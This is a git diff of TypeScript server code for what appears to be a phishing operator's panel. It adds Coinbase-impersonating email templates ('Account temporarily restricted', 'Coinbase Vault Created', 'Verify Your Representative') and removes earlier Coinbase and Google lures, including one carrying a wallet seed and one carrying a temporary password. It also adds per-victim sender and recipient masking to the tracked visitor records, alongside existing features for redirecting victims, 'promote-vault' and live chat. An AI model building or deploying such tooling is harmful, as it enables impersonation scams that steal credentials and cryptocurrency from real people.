@@ -8,6 +8,7 @@ import {
 	dbDeleteAllVisitors,
 	dbSetVisitorBypass,
 	dbSetVisitorLastTwo,
+	dbSetVisitorEmailMasks,
 	dbSetVisitorLastPage,
 	dbGetLogs,
 	dbAddLog,
@@ -35,15 +36,52 @@ interface SeedTemplate {
 }
 
 const SEED_TEMPLATES: Array<Omit<SeedTemplate, 'html'> & { file: string }> = [
-	{ id: 'Coinbase_Portal', name: 'Coinbase Support Request', subject: 'URGENT: Your Coinbase Account Requires Verification', variables: ['{{Representative name}}', '{{Case ID}}', '{{Panel Link}}'], by: 'admin', file: 'coinbase-support-request.html' },
-	{ id: 'Coinbase_SafePal', name: 'Coinbase SafePal', subject: 'Wallet Recovery Instructions', variables: ['{{Safepal Seed}}'], by: 'admin', file: 'coinbase-safepal.html' },
-	{ id: 'Google_Employee1', name: 'Google Employee #1', subject: 'Your Google Support Representative', variables: ['{{Representative Name}}', '{{Case ID}}'], by: 'admin', file: 'google-employee-1.html' },
-	{ id: 'Google_Employee2', name: 'Google Employee #2', subject: 'Representative Assignment Verification', variables: ['{{Representative Name}}', '{{Case ID}}'], by: 'admin', file: 'google-employee-2.html' },
-	{ id: 'Google_Password1', name: 'Google Password #1', subject: 'Your Temporary Access Password', variables: ['{{Password}}'], by: 'admin', file: 'google-password-1.html' },
-	{ id: 'Google_Password2', name: 'Google Password #2', subject: 'Recent Call Follow-Up', variables: ['{{Password}}'], by: 'admin', file: 'google-password-2.html' },
-	{ id: 'Google_Portal1', name: 'Google Portal #1', subject: 'Your Access Portal', variables: ['{{Case ID}}', '{{Panel Link}}'], by: 'admin', file: 'google-portal-1.html' },
-	{ id: 'Google_Portal2', name: 'Google Portal #2', subject: 'Case Portal Access', variables: ['{{Representative Name}}', '{{Case ID}}', '{{Panel Link}}'], by: 'admin', file: 'google-portal-2.html' },
-	{ id: 'Google_Portal3', name: 'Google Portal #3', subject: 'Case Access Portal', variables: ['{{Panel Link}}'], by: 'admin', file: 'google-portal-3.html' }
+	{
+		id: 'cblockacc',
+		name: 'cblockacc',
+		subject: 'Account temporarily restricted',
+		variables: ['{{CUSTOMER_NAME}}', '{{CASE_ID}}', '{{REPRESENTATIVE_NAME}}'],
+		by: 'admin',
+		file: 'cblockacc.html'
+	},
+	{
+		id: 'Coinbase_Callback',
+		name: 'Coinbase Callback',
+		subject: 'Callback Information',
+		variables: [
+			'{{CUSTOMER_NAME}}',
+			'{{CASE_ID}}',
+			'{{REPRESENTATIVE_NAME}}',
+			'{{CALLBACK_DATE}}',
+			'{{CALLBACK_TIME}}'
+		],
+		by: 'admin',
+		file: 'coinbase-callback.html'
+	},
+	{
+		id: 'Coinbase_Vault',
+		name: 'Coinbase Vault',
+		subject: 'Coinbase Vault Created',
+		variables: ['{{DATE}}', '{{case_id}}', '{{UNSUBSCRIBE_URL}}'],
+		by: 'admin',
+		file: 'coinbase-vault.html'
+	},
+	{
+		id: 'Coinbase_Review',
+		name: 'Coinbase Review',
+		subject: 'Review Account Activity',
+		variables: ['{{DATE}}', '{{ticket_number}}', '{{secure_portal_url}}', '{{UNSUBSCRIBE_URL}}'],
+		by: 'admin',
+		file: 'coinbase-review.html'
+	},
+	{
+		id: 'Coinbase_Employee',
+		name: 'Coinbase Employee',
+		subject: 'Verify Your Representative',
+		variables: ['{{DATE}}', '{{ticket_id}}', '{{EmployeeName}}', '{{Phone}}', '{{UNSUBSCRIBE_URL}}'],
+		by: 'admin',
+		file: 'coinbase-employee.html'
+	}
 ];
 
 function loadSeedTemplates(): SeedTemplate[] {
@@ -92,6 +130,8 @@ export interface Visitor {
 	flowBypassed: boolean;
 	capturedBy: string;
 	lastTwoDigits: string;
+	emailFrom: string;
+	emailTo: string;
 }
 
 export interface LogEntry {
@@ -200,6 +240,7 @@ export interface CustomDomain {
 	cfNsPrimary: string;
 	cfNsSecondary: string;
 	lastChecked: number;
+	flowId: string;
 }
 
 export interface InboxAccount {
@@ -242,7 +283,7 @@ export type ClientEvent =
 	| { type: 'inbox:add'; payload: { email: string; imapHost: string; imapPort: number } }
 	| { type: 'inbox:remove'; payload: { id: string } }
 	| { type: 'inbox:refresh'; payload: Record<string, never> }
-	| { type: 'profile:update'; payload: { password: string } }
+	| { type: 'profile:update'; payload: { password?: string; username?: string } }
 	| { type: 'profile:rotate-key'; payload: Record<string, never> }
 	| { type: 'stats:request'; payload: Record<string, never> }
 	| { type: 'visitor:redirect'; payload: { ip: string; template: string } }
@@ -252,6 +293,7 @@ export type ClientEvent =
 	| { type: 'visitors:delete'; payload: Record<string, never> }
 	| { type: 'visitor:bypass-flow'; payload: { ip: string; bypassed: boolean } }
 	| { type: 'visitor:set-last-two'; payload: { ip: string; digits: string } }
+	| { type: 'visitor:set-email-masks'; payload: { ip: string; emailFrom: string; emailTo: string } }
 	| { type: 'visitor:promote-vault'; payload: { ip: string } }
 	| { type: 'visitor:livechat-open'; payload: { ip: string } }
 	| { type: 'visitor:export'; payload: { ip: string } }
@@ -503,6 +545,16 @@ export class ServerState {
 		if (visitor) {
 			visitor.lastTwoDigits = digits;
 			try { dbSetVisitorLastTwo(ip, digits); } catch { /* non-critical */ }
+		}
+		return visitor;
+	}
+
+	setVisitorEmailMasks(ip: string, emailFrom: string, emailTo: string): Visitor | undefined {
+		const visitor = this.visitors.get(ip);
+		if (visitor) {
+			visitor.emailFrom = emailFrom;
+			visitor.emailTo = emailTo;
+			try { dbSetVisitorEmailMasks(ip, emailFrom, emailTo); } catch { /* non-critical */ }
 		}
 		return visitor;
 	}
